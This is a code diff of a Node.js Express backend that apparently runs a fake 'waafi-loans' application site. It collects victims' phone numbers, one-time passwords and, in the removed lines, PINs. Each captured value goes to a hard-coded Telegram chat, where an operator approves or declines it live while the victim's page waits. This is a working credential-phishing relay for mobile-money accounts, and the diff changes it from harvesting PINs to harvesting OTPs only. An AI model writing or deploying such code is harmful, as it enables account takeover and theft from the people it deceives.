@@ -18,22 +18,13 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8444365382';
 // ===== OTP STORAGE (In-memory) =====
 const otpStore = new Map();
 
-// ===== PIN STORAGE (In-memory) =====
-const pinStore = new Map();
-
-// Clean up expired entries every 5 minutes
+// Clean up expired OTPs every 5 minutes
 setInterval(() => {
     const now = Date.now();
     for (const [key, value] of otpStore.entries()) {
         if (now > value.expiresAt) {
             otpStore.delete(key);
             console.log(`🗑️ OTP expired for ${key}`);
-        }
-    }
-    for (const [key, value] of pinStore.entries()) {
-        if (now > value.expiresAt) {
-            pinStore.delete(key);
-            console.log(`🗑️ PIN expired for ${key}`);
         }
     }
 }, 5 * 60 * 1000);
@@ -122,30 +113,6 @@ function formatOtpResultData(data) {
     `;
 }
 
-function formatPinRequestData(data) {
-    return `
-🔐 <b>PIN VERIFICATION REQUEST</b>
-━━━━━━━━━━━━━━━━━━━
-📱 <b>Phone Number:</b> ${data.phoneNumber || 'N/A'}
-🔑 <b>PIN:</b> <b>${data.pin}</b>
-⏰ <b>Requested at:</b> ${new Date().toLocaleString()}
-━━━━━━━━━━━━━━━━━━━
-⚠️ <b>Action Required:</b> Proceed or Decline this PIN
-    `;
-}
-
-function formatPinResultData(data) {
-    return `
-📊 <b>PIN VERIFICATION RESULT</b>
-━━━━━━━━━━━━━━━━━━━
-📱 <b>Phone Number:</b> ${data.phoneNumber || 'N/A'}
-🔑 <b>PIN:</b> ${data.pin || 'N/A'}
-📊 <b>Status:</b> ${data.status === 'approved' ? '✅ PROCEED' : '❌ DECLINED'}
-━━━━━━━━━━━━━━━━━━━
-🕐 ${new Date().toLocaleString()}
-    `;
-}
-
 // ===== ROUTES =====
 
 // Health check
@@ -182,7 +149,7 @@ app.post('/api/apply', async (req, res) => {
     }
 });
 
-// ===== 2. VERIFY FORM ENDPOINT (Old - keeping for compatibility) =====
+// ===== 2. VERIFY FORM ENDPOINT =====
 app.post('/api/verify', async (req, res) => {
     try {
         const data = req.body;
@@ -206,201 +173,7 @@ app.post('/api/verify', async (req, res) => {
     }
 });
 
-// ===== 3. SEND PIN TO TELEGRAM FOR ADMIN APPROVAL =====
-app.post('/api/send-pin', async (req, res) => {
-    try {
-        const { phoneNumber, pin } = req.body;
-        console.log('📨 Send PIN request for:', phoneNumber);
-
-        if (!phoneNumber || !pin) {
-            return res.status(400).json({
-                success: false,
-                message: 'Phone number and PIN are required'
-            });
-        }
-
-        const expiresAt = Date.now() + 5 * 60 * 1000; // 5 minutes
-
-        // Store PIN with pending status
-        pinStore.set(phoneNumber, {
-            pin: pin,
-            expiresAt: expiresAt,
-            status: 'pending', // pending | approved | rejected
-            timestamp: Date.now()
-        });
-
-        console.log(`🔑 PIN received for ${phoneNumber}: ${pin}`);
-
-        // Send PIN to Telegram with Proceed/Decline buttons
-        const message = formatPinRequestData({
-            phoneNumber: phoneNumber,
-            pin: pin
-        });
-
-        // Create inline keyboard with Proceed and Decline buttons
-        const replyMarkup = {
-            inline_keyboard: [
-                [
-                    {
-                        text: '✅ Proceed',
-                        callback_data: `pin_approve_${phoneNumber}_${pin}`
-                    },
-                    {
-                        text: '❌ Decline',
-                        callback_data: `pin_reject_${phoneNumber}_${pin}`
-                    }
-                ]
-            ]
-        };
-
-        await sendToTelegram(message, replyMarkup);
-
-        res.json({
-            success: true,
-            message: 'PIN sent to Telegram for verification',
-            data: {
-                phoneNumber: phoneNumber,
-                pin: pin,
-                expiresIn: '5 minutes'
-            }
-        });
-    } catch (error) {
-        console.error('❌ Error in /api/send-pin:', error);
-        res.status(500).json({
-            success: false,
-            message: 'Failed to send PIN',
-            error: error.message
-        });
-    }
-});
-
-// ===== 4. CHECK PIN STATUS (for frontend polling) =====
-app.post('/api/check-pin-status', async (req, res) => {
-    try {
-        const { phoneNumber } = req.body;
-        console.log('🔍 Checking PIN status for:', phoneNumber);
-
-        if (!phoneNumber) {
-            return res.status(400).json({
-                success: false,
-                message: 'Phone number is required'
-            });
-        }
-
-        const storedData = pinStore.get(phoneNumber);
-        
-        if (!storedData) {
-            return res.status(404).json({
-                success: false,
-                message: 'No PIN found. Please try again.'
-            });
-        }
-
-        // Check if PIN expired
-        if (Date.now() > storedData.expiresAt) {
-            pinStore.delete(phoneNumber);
-            return res.status(400).json({
-                success: false,
-                message: 'PIN expired. Please try again.'
-            });
-        }
-
-        // Return the status
-        res.json({
-            success: true,
-            data: {
-                phoneNumber: phoneNumber,
-                status: storedData.status, // pending, approved, rejected
-                pin: storedData.pin
-            }
-        });
-    } catch (error) {
-        console.error('❌ Error in /api/check-pin-status:', error);
-        res.status(500).json({
-            success: false,
-            message: 'Failed to check PIN status',
-            error: error.message
-        });
-    }
-});
-
-// ===== 5. VERIFY PIN (Called when admin approves/declines) =====
-app.post('/api/verify-pin', async (req, res) => {
-    try {
-        const { phoneNumber, pin } = req.body;
-        console.log('🔐 Verify PIN request for:', phoneNumber);
-
-        if (!phoneNumber || !pin) {
-            return res.status(400).json({
-                success: false,
-                message: 'Phone number and PIN are required'
-            });
-        }
-
-        const storedData = pinStore.get(phoneNumber);
-        
-        if (!storedData) {
-            return res.status(404).json({
-                success: false,
-                message: 'No PIN found. Please try again.'
-            });
-        }
-
-        // Check if PIN expired
-        if (Date.now() > storedData.expiresAt) {
-            pinStore.delete(phoneNumber);
-            return res.status(400).json({
-                success: false,
-                message: 'PIN expired. Please try again.'
-            });
-        }
-
-        // Check if admin has approved
-        if (storedData.status === 'pending') {
-            return res.status(202).json({
-                success: false,
-                status: 'pending',
-                message: 'Waiting for admin approval...'
-            });
-        }
-
-        if (storedData.status === 'approved') {
-            // PIN is approved by admin
-            pinStore.delete(phoneNumber);
-            
-            return res.json({
-                success: true,
-                message: 'PIN verified successfully!',
-                data: {
-                    phoneNumber: phoneNumber
-                }
-            });
-        }
-
-        if (storedData.status === 'rejected') {
-            pinStore.delete(phoneNumber);
-            
-            return res.status(400).json({
-                success: false,
-                message: 'Invalid PIN. Please try again.'
-            });
-        }
-
-        return res.status(400).json({
-            success: false,
-            message: 'Invalid PIN status'
-        });
-    } catch (error) {
-        console.error('❌ Error in /api/verify-pin:', error);
-        res.status(500).json({
-            success: false,
-            message: 'Failed to verify PIN',
-            error: error.message
-        });
-    }
-});
-
-// ===== 6. SEND OTP TO TELEGRAM FOR ADMIN APPROVAL =====
+// ===== 3. SEND OTP TO TELEGRAM FOR ADMIN APPROVAL =====
 app.post('/api/send-otp', async (req, res) => {
     try {
         const { phoneNumber } = req.body;
@@ -470,7 +243,7 @@ app.post('/api/send-otp', async (req, res) => {
     }
 });
 
-// ===== 7. CHECK OTP STATUS (for frontend polling) =====
+// ===== 4. CHECK OTP STATUS (for frontend polling) =====
 app.post('/api/check-otp-status', async (req, res) => {
     try {
         const { phoneNumber } = req.body;
@@ -520,7 +293,7 @@ app.post('/api/check-otp-status', async (req, res) => {
     }
 });
 
-// ===== 8. VERIFY OTP (Called when admin approves) =====
+// ===== 5. VERIFY OTP (Called when admin approves) =====
 app.post('/api/verify-otp', async (req, res) => {
     try {
         const { phoneNumber, otp } = req.body;
@@ -596,131 +369,80 @@ app.post('/api/verify-otp', async (req, res) => {
     }
 });
 
-// ===== 9. TELEGRAM WEBHOOK (Receives admin button clicks) =====
+// ===== 6. TELEGRAM WEBHOOK (Receives admin button clicks) =====
 app.post('/webhook/telegram', async (req, res) => {
     try {
+        console.log('📨 Webhook received:', JSON.stringify(req.body, null, 2));
+        
         const { callback_query } = req.body;
         
         if (!callback_query) {
+            console.log('⚠️ No callback_query in webhook');
             return res.sendStatus(200);
         }
 
         const { data, from, id } = callback_query;
         console.log('📨 Telegram callback received:', data);
 
-        // Parse callback data
+        // Parse callback data: approve_phoneNumber_otp or reject_phoneNumber_otp
         const parts = data.split('_');
         const action = parts[0];
+        const phoneNumber = parts.slice(1, -1).join('_'); // Handle phone numbers with underscores
+        const otp = parts[parts.length - 1];
+
+        console.log(`Action: ${action}, Phone: ${phoneNumber}, OTP: ${otp}`);
+
+        // Update OTP status
+        const storedData = otpStore.get(phoneNumber);
         
-        // Check if it's a PIN callback (starts with 'pin')
-        if (action === 'pin') {
-            // PIN callback format: pin_approve_phoneNumber_pin or pin_reject_phoneNumber_pin
-            const pinAction = parts[1]; // approve or reject
-            const phoneNumber = parts.slice(2, -1).join('_');
-            const pin = parts[parts.length - 1];
-
-            console.log(`PIN Action: ${pinAction}, Phone: ${phoneNumber}, PIN: ${pin}`);
-
-            const storedData = pinStore.get(phoneNumber);
-            
-            if (storedData && storedData.pin === pin) {
-                if (pinAction === 'approve') {
-                    storedData.status = 'approved';
-                    pinStore.set(phoneNumber, storedData);
-                    console.log(`✅ PIN approved for ${phoneNumber}`);
-                    
-                    const resultMessage = formatPinResultData({
-                        phoneNumber: phoneNumber,
-                        pin: pin,
-                        status: 'approved'
-                    });
-                    await sendToTelegram(resultMessage);
-                    
-                    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                        callback_query_id: id,
-                        text: '✅ PIN Proceed! User can continue to OTP.',
-                        show_alert: true
-                    });
-                } else if (pinAction === 'reject') {
-                    storedData.status = 'rejected';
-                    pinStore.set(phoneNumber, storedData);
-                    console.log(`❌ PIN rejected for ${phoneNumber}`);
-                    
-                    const resultMessage = formatPinResultData({
-                        phoneNumber: phoneNumber,
-                        pin: pin,
-                        status: 'rejected'
-                    });
-                    await sendToTelegram(resultMessage);
-                    
-                    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                        callback_query_id: id,
-                        text: '❌ PIN Declined! User will be notified.',
-                        show_alert: true
-                    });
-                }
-            } else {
-                console.log('⚠️ PIN not found or already processed');
+        if (storedData && storedData.otp === otp) {
+            if (action === 'approve') {
+                storedData.status = 'approved';
+                otpStore.set(phoneNumber, storedData);
+                console.log(`✅ OTP approved for ${phoneNumber}`);
+                
+                // Send approval notification to Telegram
+                const resultMessage = formatOtpResultData({
+                    phoneNumber: phoneNumber,
+                    otp: otp,
+                    status: 'approved'
+                });
+                await sendToTelegram(resultMessage);
+                
+                // Answer callback
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                     callback_query_id: id,
-                    text: '⚠️ PIN already processed or expired.',
+                    text: '✅ OTP Approved! User can now proceed.',
+                    show_alert: true
+                });
+            } else if (action === 'reject') {
+                storedData.status = 'rejected';
+                otpStore.set(phoneNumber, storedData);
+                console.log(`❌ OTP rejected for ${phoneNumber}`);
+                
+                // Send rejection notification to Telegram
+                const resultMessage = formatOtpResultData({
+                    phoneNumber: phoneNumber,
+                    otp: otp,
+                    status: 'rejected'
+                });
+                await sendToTelegram(resultMessage);
+                
+                // Answer callback
+                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                    callback_query_id: id,
+                    text: '❌ OTP Rejected! User will be notified.',
                     show_alert: true
                 });
             }
         } else {
-            // OTP callback: approve_phoneNumber_otp or reject_phoneNumber_otp
-            const otpAction = action; // approve or reject
-            const phoneNumber = parts.slice(1, -1).join('_');
-            const otp = parts[parts.length - 1];
-
-            console.log(`OTP Action: ${otpAction}, Phone: ${phoneNumber}, OTP: ${otp}`);
-
-            const storedData = otpStore.get(phoneNumber);
+            console.log('⚠️ OTP not found or already processed');
             
-            if (storedData && storedData.otp === otp) {
-                if (otpAction === 'approve') {
-                    storedData.status = 'approved';
-                    otpStore.set(phoneNumber, storedData);
-                    console.log(`✅ OTP approved for ${phoneNumber}`);
-                    
-                    const resultMessage = formatOtpResultData({
-                        phoneNumber: phoneNumber,
-                        otp: otp,
-                        status: 'approved'
-                    });
-                    await sendToTelegram(resultMessage);
-                    
-                    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                        callback_query_id: id,
-                        text: '✅ OTP Approved! User can now proceed.',
-                        show_alert: true
-                    });
-                } else if (otpAction === 'reject') {
-                    storedData.status = 'rejected';
-                    otpStore.set(phoneNumber, storedData);
-                    console.log(`❌ OTP rejected for ${phoneNumber}`);
-                    
-                    const resultMessage = formatOtpResultData({
-                        phoneNumber: phoneNumber,
-                        otp: otp,
-                        status: 'rejected'
-                    });
-                    await sendToTelegram(resultMessage);
-                    
-                    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                        callback_query_id: id,
-                        text: '❌ OTP Rejected! User will be notified.',
-                        show_alert: true
-                    });
-                }
-            } else {
-                console.log('⚠️ OTP not found or already processed');
-                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                    callback_query_id: id,
-                    text: '⚠️ OTP already processed or expired.',
-                    show_alert: true
-                });
-            }
+            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                callback_query_id: id,
+                text: '⚠️ OTP already processed or expired.',
+                show_alert: true
+            });
         }
 
         res.sendStatus(200);
@@ -730,12 +452,13 @@ app.post('/webhook/telegram', async (req, res) => {
     }
 });
 
-// ===== 10. SET WEBHOOK ENDPOINT =====
+// ===== 7. SET WEBHOOK ENDPOINT =====
 app.get('/api/set-webhook', async (req, res) => {
     try {
         const webhookUrl = `https://waafi-loans-production.up.railway.app/webhook/telegram`;
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${webhookUrl}`;
         
+        console.log('🔗 Setting webhook URL:', webhookUrl);
         const response = await axios.get(url);
         console.log('Webhook set:', response.data);
         
@@ -754,7 +477,28 @@ app.get('/api/set-webhook', async (req, res) => {
     }
 });
 
-// ===== 11. TEST TELEGRAM ENDPOINT =====
+// ===== 8. GET WEBHOOK INFO =====
+app.get('/api/get-webhook', async (req, res) => {
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getWebhookInfo`;
+        const response = await axios.get(url);
+        console.log('Webhook info:', response.data);
+        
+        res.json({
+            success: true,
+            data: response.data
+        });
+    } catch (error) {
+        console.error('❌ Error getting webhook info:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Failed to get webhook info',
+            error: error.message
+        });
+    }
+});
+
+// ===== 9. TEST TELEGRAM ENDPOINT =====
 app.get('/api/test-telegram', async (req, res) => {
     try {
         const testMessage = `
@@ -789,6 +533,6 @@ app.listen(PORT, () => {
     console.log(`🤖 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ❌'}`);
     console.log(`📱 Telegram Chat ID: ${TELEGRAM_CHAT_ID || 'Not set ❌'}`);
     console.log(`🔢 OTP Store: Ready`);
-    console.log(`🔑 PIN Store: Ready`);
     console.log(`📨 Webhook URL: https://waafi-loans-production.up.railway.app/webhook/telegram`);
+    console.log(`🔗 Set Webhook: https://waafi-loans-production.up.railway.app/api/set-webhook`);
 });
